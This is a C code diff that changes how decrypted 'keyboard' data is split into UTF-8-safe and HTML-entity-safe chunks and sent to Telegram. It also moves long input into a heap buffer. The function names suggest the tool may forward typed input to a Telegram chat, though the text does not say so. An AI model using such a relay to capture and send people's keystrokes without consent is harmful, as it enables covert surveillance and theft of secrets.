@@ -966,6 +966,40 @@ static void escape_html_append(const char *src, size_t src_len, char *dst,
   dst[*dst_len] = '\0';
 }
 
+static size_t find_safe_split_point(const char *str, size_t max_len) {
+  if (max_len == 0)
+    return 0;
+
+  size_t take = max_len;
+
+  while (take > 0 && ((unsigned char)str[take] & 0xC0) == 0x80) {
+    take--;
+  }
+
+  size_t lookback = (take < 8) ? take : 8;
+  for (size_t i = 1; i <= lookback; i++) {
+    size_t idx = take - i;
+    if (str[idx] == '&') {
+      int closed = 0;
+      for (size_t j = idx + 1; j < take; j++) {
+        if (str[j] == ';') {
+          closed = 1;
+          break;
+        }
+      }
+      if (!closed) {
+        take = idx;
+      }
+      break;
+    }
+    if (str[idx] == ';') {
+      break;
+    }
+  }
+
+  return (take > 0) ? take : max_len;
+}
+
 int telegram_send_keyboard(const char *text, size_t length) {
   if (!initialized || !text || length == 0)
     return 1;
@@ -1024,21 +1058,31 @@ int telegram_send_keyboard(const char *text, size_t length) {
     result = telegram_send_html(msg);
     c2t_secure_zero(msg, sizeof(msg));
   } else {
-    size_t total_chunks =
-        (escaped_len + MAX_CODE_BODY_LEN - 1) / MAX_CODE_BODY_LEN;
+    size_t total_chunks = 0;
+    size_t sim_offset = 0;
+    while (sim_offset < escaped_len) {
+      size_t remaining = escaped_len - sim_offset;
+      size_t take = (remaining <= MAX_CODE_BODY_LEN)
+                        ? remaining
+                        : find_safe_split_point(escaped + sim_offset,
+                                                MAX_CODE_BODY_LEN);
+      if (take == 0 || take > remaining)
+        take = (remaining <= MAX_CODE_BODY_LEN) ? remaining : MAX_CODE_BODY_LEN;
+      sim_offset += take;
+      total_chunks++;
+    }
+
     size_t chunk_idx = 0;
     size_t offset = 0;
 
     while (offset < escaped_len) {
-      size_t take = escaped_len - offset;
-      if (take > MAX_CODE_BODY_LEN)
-        take = MAX_CODE_BODY_LEN;
-
-      if (take < escaped_len - offset && escaped[offset + take - 1] == '&') {
-        while (take > 0 && escaped[offset + take - 1] != ';') {
-          take--;
-        }
-      }
+      size_t remaining = escaped_len - offset;
+      size_t take = (remaining <= MAX_CODE_BODY_LEN)
+                        ? remaining
+                        : find_safe_split_point(escaped + offset,
+                                                MAX_CODE_BODY_LEN);
+      if (take == 0 || take > remaining)
+        take = (remaining <= MAX_CODE_BODY_LEN) ? remaining : MAX_CODE_BODY_LEN;
 
       char chunk_buf[MAX_CODE_BODY_LEN + 1];
       memcpy(chunk_buf, escaped + offset, take);
@@ -1078,19 +1122,33 @@ int telegram_send_encrypted_data(
     return 0;
 
   if (strcmp(mime_type, C2T_KEYBOARD_MIME_TYPE) == 0) {
-    if (length < TELEGRAM_MAX_CHARACTERS) {
-      char text_buf[TELEGRAM_MAX_CHARACTERS + 1];
-      c2t_secure_lock(text_buf, sizeof(text_buf));
-      if (!c2t_crypto_decrypt(encrypted_data, length, nonce, text_buf)) {
-        c2t_secure_unlock(text_buf, sizeof(text_buf));
-        return 0;
-      }
-      text_buf[length] = '\0';
-      int res = telegram_send_keyboard(text_buf, length);
-      c2t_secure_zero(text_buf, sizeof(text_buf));
-      c2t_secure_unlock(text_buf, sizeof(text_buf));
-      return res;
+    char stack_buf[TELEGRAM_MAX_CHARACTERS + 1];
+    char *text_buf = (length <= TELEGRAM_MAX_CHARACTERS)
+                         ? stack_buf
+                         : malloc(length + 1);
+    if (!text_buf) {
+      c2t_log_error("telegram",
+                    "Out of memory allocating keyboard decrypt buffer");
+      return 0;
     }
+    c2t_secure_lock(text_buf, length + 1);
+    if (!c2t_crypto_decrypt(encrypted_data, length, nonce, text_buf)) {
+      c2t_secure_unlock(text_buf, length + 1);
+      if (text_buf != stack_buf) {
+        c2t_secure_zero(stack_buf, sizeof(stack_buf));
+        free(text_buf);
+      }
+      return 0;
+    }
+    text_buf[length] = '\0';
+    int res = telegram_send_keyboard(text_buf, length);
+    c2t_secure_zero(text_buf, length + 1);
+    c2t_secure_unlock(text_buf, length + 1);
+    if (text_buf != stack_buf) {
+      c2t_secure_zero(stack_buf, sizeof(stack_buf));
+      free(text_buf);
+    }
+    return res;
   }
 
   if (mime_has_prefix(mime_type, "text/") && length < TELEGRAM_MAX_CHARACTERS) {
